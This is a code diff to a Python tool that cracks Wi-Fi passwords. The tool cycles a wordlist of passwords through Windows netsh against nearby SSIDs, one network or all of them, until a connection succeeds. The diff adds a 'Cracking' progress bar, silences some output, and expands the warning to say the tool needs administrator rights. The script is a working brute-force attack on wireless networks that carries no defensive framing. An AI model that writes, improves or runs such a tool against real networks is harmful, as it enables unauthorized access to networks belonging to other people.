@@ -1,3 +1,4 @@
+from alive_progress import alive_bar
 import requests
 import subprocess
 import time
@@ -7,7 +8,7 @@ import passwords
 
 def connect_to_wifi(ssid, password):
     
-    print(f" ➡️ {bcolors.OKCYAN}"+ssid+f"{bcolors.ENDC}:{bcolors.CYAN}"+password+f"{bcolors.ENDC}")
+    # print(f" ➡️ {bcolors.OKCYAN}"+ssid+f"{bcolors.ENDC}:{bcolors.CYAN}"+password+f"{bcolors.ENDC}")
     
     try:
         # Connect to the Wi-Fi network using netsh
@@ -25,7 +26,7 @@ def connect_to_wifi(ssid, password):
         time.sleep(10)
         
         if is_connected():
-            print(f"  ✅ {bcolors.OKGREEN}Success{bcolors.ENDC}.")
+            # print(f"  ✅ {bcolors.OKGREEN}Success{bcolors.ENDC}.")
             return True
         
         return False
@@ -136,7 +137,7 @@ def thinBorderBlue():
 def main():
 
     thinBorderBlue()
-    print(f" {bcolors.FAIL}WARNING: To use this tool effectively, disconnect from WiFi.\n You may also need to forget saved WiFi profiles if you have connected to the network before.")
+    print(f" {bcolors.FAIL}WARNING: To use this tool effectively, disconnect from WiFi, run as an administrator, and make sure your location services are turned on for Windows apps.\n You may also need to forget saved WiFi profiles if you have connected to the network before.\n The tool is slow, so be prepared to let it run for a while.")
     thinBorderBlue()
     
     thinBorderBlue()
@@ -195,18 +196,26 @@ def main():
     if userInput:
         if userInput == "a":
             # Cycle through all available networks trying them all
-            for password in passwords.wifiPasswords:
-                for ssid in ssids:
-                    if connect_to_wifi(ssid, password):
-                        return
+            n = len(passwords.wifiPasswords) * len(ssids)
+            with alive_bar(n, title=f"➡️ Cracking") as bar:
+                for password in passwords.wifiPasswords:
+                    for ssid in ssids:
+                        bar.text(f"{bcolors.OKCYAN}{ssid}{bcolors.ENDC}:{bcolors.CYAN}{password}{bcolors.ENDC}")
+                        if connect_to_wifi(ssid, password):
+                            bar()
+                            return
+                        bar()
         else:
             # Focus on selected network only
             selected_index = int(userInput) - 1
             selected_ssid = ssids[selected_index]
-            # password = input(f"{bcolors.ENDC}Enter the password for {bcolors.OKCYAN}{selected_ssid}{bcolors.ENDC}: {bcolors.OKGREEN}")
-            # print(f"{bcolors.ENDC}")
-            for password in passwords.wifiPasswords:
-                if connect_to_wifi(selected_ssid, password):
-                    return
+            n = len(passwords.wifiPasswords)
+            with alive_bar(n, title=f"➡️ Cracking") as bar:
+                for password in passwords.wifiPasswords:
+                    bar.text(f"{bcolors.OKCYAN}{selected_ssid}{bcolors.ENDC}:{bcolors.CYAN}{password}{bcolors.ENDC}")
+                    if connect_to_wifi(selected_ssid, password):
+                        bar()
+                        return
+                    bar()
 
 main()
